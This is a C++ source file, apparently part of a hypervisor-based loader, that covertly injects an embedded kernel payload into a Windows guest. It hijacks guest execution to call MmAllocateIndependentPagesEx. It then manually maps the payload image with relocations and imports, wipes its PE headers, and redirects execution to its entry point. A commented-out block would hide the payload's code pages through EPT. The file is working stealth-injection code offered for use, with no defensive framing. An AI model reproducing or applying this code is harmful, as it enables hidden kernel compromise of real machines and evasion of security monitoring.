// =============================================================================
// VMM Shadow Mapper - Payload Deployer (Business Management Module)
// Coordinates loading of RWbase payloads
// =============================================================================

#include "deployer.h"
#include "modules/loader/loader.h"
#include "modules/logs/logs.h"
#include "modules/crt/crt.h"
#include "modules/memory_manager/memory_manager.h"
#include "modules/slat/slat.h"
#include "modules/slat/cr3/cr3.h"
#include "modules/slat/hook/hook.h"
#include "modules/arch/arch.h"
#include <intrin.h>

// Include the generated payload binaries
#include <payload/payload_bin.h>

// Access to global runtime context for injection state
#include "../../runtime/runtime_context.h"

namespace loader {

// =============================================================================
// Dynamic Injection Helpers (Stage Machine Support)
// =============================================================================

bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);

    // Fix: Read RSP from VMCS as tf->rsp might be unreliable (especially for #DB exits)
    // The original Hyper-V handler might not populate RSP in the trap frame for all exit types.
    tf->rsp = arch::get_guest_rsp();

    const uint64_t guest_rsp = tf->rsp;

    auto& inject_ctx = g_runtime_context.injection_ctx;

    // 1. Resolve Allocation API if not already resolved
    if (inject_ctx.allocation_routine == 0) {
        if (g_runtime_context.ntoskrnl_base == 0) return false;
        
        inject_ctx.allocation_routine = resolve_mm_allocate_independent_pages_ex(g_runtime_context.ntoskrnl_base);
        if (inject_ctx.allocation_routine == 0) {
             logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to resolve MmAllocateIndependentPagesEx\n");
             return false;
        }
    }

    // 2. Backup Context
    crt::copy_memory(&inject_ctx.saved_guest_context, tf, sizeof(trap_frame_t));
    inject_ctx.saved_rip = arch::get_guest_rip(); // Save original RIP (NtOpenFile entry)

    // 3. Prepare Arguments for MmAllocateIndependentPagesEx
    // PVOID MmAllocateIndependentPagesEx(SIZE_T NumberOfBytes, ULONG Node, ULONG64 AllocationType, ULONG64 Protect);
    
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t image_size = nt->optional_header.size_of_image;
    std::uint64_t bytes_written = 0;

    tf->rcx = image_size;                 // NumberOfBytes (Virtual Size)
    tf->rdx = 0xFFFFFFFF;                 // Node (Current)
    tf->r8 = 0;                           // AllocationType (Normal)
    tf->r9 = 0x20;                        // Protect (PAGE_EXECUTE_READ)

    // 4. Setup Stack (Shadow Space + Return Address)
    // We need to write to Guest Stack. We need to map Guest RSP to Host VA.
    // NOTE: This assumes we can access Guest RAM.

    // Stack Alignment Logic:
    // Windows x64 ABI requires RSP to be 16-byte aligned AFTER the CALL instruction pushes the return address.
    // This means BEFORE the CALL (at the call site), RSP should be 16-byte aligned.
    // When our hijacked function starts, it expects (RSP + 8) to be 16-byte aligned.
    // So the RSP value we set (which points to the return address) must be such that (NewRSP + 8) % 16 == 0.
    // Which means NewRSP % 16 == 8.
    
    // Let's reserve space for:
    // - Shadow Space (32 bytes / 0x20)
    // - Return Address (8 bytes / 0x08)
    // Total decrement needs to land us at an address ending in 8.
    
    // First, align current RSP down to 16 bytes to be safe as a base.
    uint64_t aligned_base_rsp = guest_rsp & ~0xF; 
    
    // We need NewRSP to point to the Return Address.
    // The function will push RBP etc, and subtract from RSP.
    // But at the entry (our hijack target), RSP points to Return Address.
    // So NewRSP must be 8 modulo 16.
    
    // If we subtract 0x28 (40 bytes) from an aligned base:
    // AlignedBase (0x...0) - 0x28 = 0x...D8. 
    // 0xD8 % 16 = 216 % 16 = 8.  (Correct!)
    
    // So: Align guest RSP down to 16, then subtract 0x28.
    // 0x20 (Shadow) + 0x8 (RetAddr) = 0x28.
    const uint64_t new_rsp = aligned_base_rsp - 0x28;
    const uint64_t required_stack = 0x200;
    if (new_rsp < required_stack) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Guest RSP too low for hijack. RSP=%p NewRSP=%p\n", guest_rsp, new_rsp);
        return false;
    }

    const uint64_t probe_start = (new_rsp - required_stack) & ~0xFFFull;
    const uint64_t probe_end = ((new_rsp + 0x20) & ~0xFFFull) + 0x1000;
    for (uint64_t probe = probe_start; probe < probe_end; probe += 0x1000) {
        virtual_address_t gva_probe = {};
        gva_probe.address = probe;
        const uint64_t probe_pa = memory_manager::translate_guest_virtual_address(
            arch::get_guest_cr3(),
            slat::hyperv_cr3(&g_runtime_context.slat_ctx),
            gva_probe
        );
        if (probe_pa == 0) {
            logs::print(ctx->log_ctx, "[Injection] ERROR: Guest stack guard reached. RSP=%p NewRSP=%p Probe=%p\n", guest_rsp, new_rsp, probe);
            return false;
        }
    }

    ctx->guest_cr3 = arch::get_guest_cr3();
    ctx->slat_cr3 = slat::hyperv_cr3(&g_runtime_context.slat_ctx);
    uint64_t magic_trap = injection_ctx_t::MAGIC_TRAP_RIP;
    bytes_written = memory_manager::operate_on_guest_virtual_memory(
        ctx->slat_cr3,
        reinterpret_cast<void*>(&magic_trap),
        new_rsp,
        ctx->guest_cr3,
        sizeof(magic_trap),
        memory_operation_t::write_operation
    );
    if (bytes_written != sizeof(magic_trap)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to write Magic Trap on Guest Stack\n");
        return false;
    }

    // 5. Update Trap Frame
    tf->rsp = new_rsp;
    arch::set_guest_rsp(new_rsp); // Update VMCS
    arch::set_guest_rip(inject_ctx.allocation_routine);

    // Enable #PF Interception to catch return from unmapped Magic Trap address
    uint64_t exception_bitmap = 0;
    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
    exception_bitmap |= (1ULL << 14); // Enable #PF (Vector 14)
    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);

    logs::print(ctx->log_ctx, "[Injection] Stage 1: Hijacked execution for Allocation. RIP=0x%p. Enabled #PF trap.\n", inject_ctx.allocation_routine);
    return true;
}

bool harvest_allocation_result(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
    auto& inject_ctx = g_runtime_context.injection_ctx;

    // 1. Capture Result
    const uint64_t allocated_base = tf->rax;
    if (allocated_base == 0) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Allocation returned null\n");
        return false;
    }

    inject_ctx.allocated_buffer = allocated_base;
    inject_ctx.payload_guest_base.store(allocated_base, std::memory_order_release);

    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t image_size = nt->optional_header.size_of_image;
    if (image_size == 0) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Payload size is zero\n");
        return false;
    }

    inject_ctx.allocation_size.store(image_size, std::memory_order_release);

    logs::print(ctx->log_ctx, "[Injection] Stage 2: Allocation captured. Base=0x%p Size=0x%X\n", allocated_base, image_size);

    return true;
}

bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
    auto& inject_ctx = g_runtime_context.injection_ctx;
    bool success = true;
    uint64_t entry_va = 0;
    bool handoff_to_payload = false;
    uint64_t payload_rsp = 0;
    uint64_t exception_bitmap = 0;
    std::uint64_t bytes_written = 0;
    uint64_t magic_trap = 0;
    allocation_info_t alloc = {};

    // 1. Get Image Info
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t payload_image_size = nt->optional_header.size_of_image;

    const uint64_t target_va = inject_ctx.payload_guest_base.load(std::memory_order_acquire);
    const uint64_t allocated_base = inject_ctx.allocated_buffer;
    const uint32_t allocation_size = inject_ctx.allocation_size.load(std::memory_order_acquire);

    // logs::print(ctx->log_ctx, "[Injection] STAGE 3 SKIPPED: Allocated Address=0x%p, Size=0x%X\n", target_va, image_size);

    if (target_va == 0 || allocated_base == 0 || allocation_size == 0 || target_va != allocated_base) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Allocation context mismatch\n");
        success = false;
        goto restore_context;
    }

    if (payload_image_size == 0 || payload_image_size != allocation_size) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Payload size mismatch\n");
        success = false;
        goto restore_context;
    }

    if (!allocate_payload_staging_buffer(ctx, allocation_size, &alloc)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate staging buffer for RWbase\n");
        success = false;
        goto restore_context;
    }

    crt::set_memory(alloc.host_buffer, 0, allocation_size);
    if (!map_sections(alloc.host_buffer, payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map sections\n");
        success = false;
        goto restore_context;
    }

    // 4. Fix Security Cookie
    if (!fix_security_cookie(ctx, alloc.host_buffer, target_va)) {
        logs::print(ctx->log_ctx, "[Injection] WARNING: Cookie fix failed\n");
    }

    // 5. Apply Relocations
    if (!apply_relocations(ctx, alloc.host_buffer, target_va)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Relocation failed\n");
        success = false;
        goto restore_context;
    }

    // 6. Resolve Imports
    if (!resolve_payload_imports(ctx, alloc.host_buffer, g_runtime_context.ntoskrnl_base)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Import resolution failed\n");
        success = false;
        goto restore_context;
    }

    ctx->guest_cr3 = arch::get_guest_cr3();
    ctx->slat_cr3 = slat::hyperv_cr3(&g_runtime_context.slat_ctx);

    bytes_written = memory_manager::operate_on_guest_virtual_memory(
        ctx->slat_cr3,
        alloc.host_buffer,
        target_va,
        ctx->guest_cr3,
        allocation_size,
        memory_operation_t::write_operation
    );

    if (bytes_written != allocation_size) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to write payload into Guest memory\n");
        success = false;
        goto restore_context;
    }

    if (!wipe_pe_headers(ctx, target_va, payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to wipe PE headers\n");
        success = false;
        goto restore_context;
    }
    logs::print(ctx->log_ctx, "[Injection] Stage 3: PE headers wiped\n");

    if (!apply_section_permissions(ctx, target_va, payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to update section permissions\n");
        success = false;
        goto restore_context;
    }
    logs::print(ctx->log_ctx, "[Injection] Stage 3: Section permissions updated\n");
/*
    // ==========================================
    // 自动隐藏 .text 段 (EPT Execute-Only)
    // ==========================================
    for (uint16_t i = 0; i < nt->file_header.number_of_sections; i++) {
        section_info_t info = {};
        if (get_payload_section_info(payload::rwbase_image, payload::rwbase_image_size, i, &info)) {
            if (crt::string_compare(info.name, ".text")) {
                uint64_t text_va = target_va + info.virtual_address;
                uint32_t text_size = info.virtual_size;
                
                // 按页遍历 .text 段并应用 EPT 隐藏
                for (uint64_t offset = 0; offset < text_size; offset += 0x1000) {
                    virtual_address_t page_va = { .address = text_va + offset };
                    virtual_address_t page_pa = { .address = memory_manager::translate_guest_virtual_address(ctx->guest_cr3, ctx->slat_cr3, page_va) };
                    if (page_pa.address != 0) {
                        slat::hook::hide_payload_memory(&g_runtime_context.slat_ctx, page_pa);
                    }
                }
                logs::print(ctx->log_ctx, "[Injection] Stage 3: .text section hidden via EPT\n");
            }
        }
    }
*/
    entry_va = target_va + nt->optional_header.address_of_entry_point;
    inject_ctx.payload_guest_base.store(target_va);
    inject_ctx.payload_entry.store(entry_va);

    payload_rsp = inject_ctx.saved_guest_context.rsp;
    payload_rsp &= ~0xFULL;
    payload_rsp -= 0x28;
    magic_trap = injection_ctx_t::MAGIC_TRAP_RIP;
    bytes_written = memory_manager::operate_on_guest_virtual_memory(
        ctx->slat_cr3,
        reinterpret_cast<void*>(&magic_trap),
        payload_rsp,
        ctx->guest_cr3,
        sizeof(magic_trap),
        memory_operation_t::write_operation
    );
    if (bytes_written != sizeof(magic_trap)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to write Magic Trap on Guest Stack\n");
        success = false;
        goto restore_context;
    }

    slat::flush_current_logical_processor_cache(1);
    arch::set_guest_rip(entry_va);
    arch::set_guest_rsp(payload_rsp);

    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
    exception_bitmap |= (1ULL << 14);
    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);

    inject_ctx.stage.store(3);
    handoff_to_payload = true;


    arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100);
    if (handoff_to_payload) {
        logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Entry hijack armed.\n");
        return true;
    }
    logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Entry hijack skipped.\n");

restore_context:
    free_payload_staging_buffer(ctx, &alloc);
    crt::copy_memory(tf, &inject_ctx.saved_guest_context, sizeof(trap_frame_t));
    arch::set_guest_rsp(tf->rsp);
    arch::set_guest_rip(inject_ctx.saved_rip);

    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
    exception_bitmap &= ~(1ULL << 14);
    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);

    logs::print(ctx->log_ctx, "[Injection] Stage 3: Context restored. Disabled #PF trap. Resuming original flow.\n");
    inject_ctx.stage.store(2);
    return success;
}

} // namespace loader
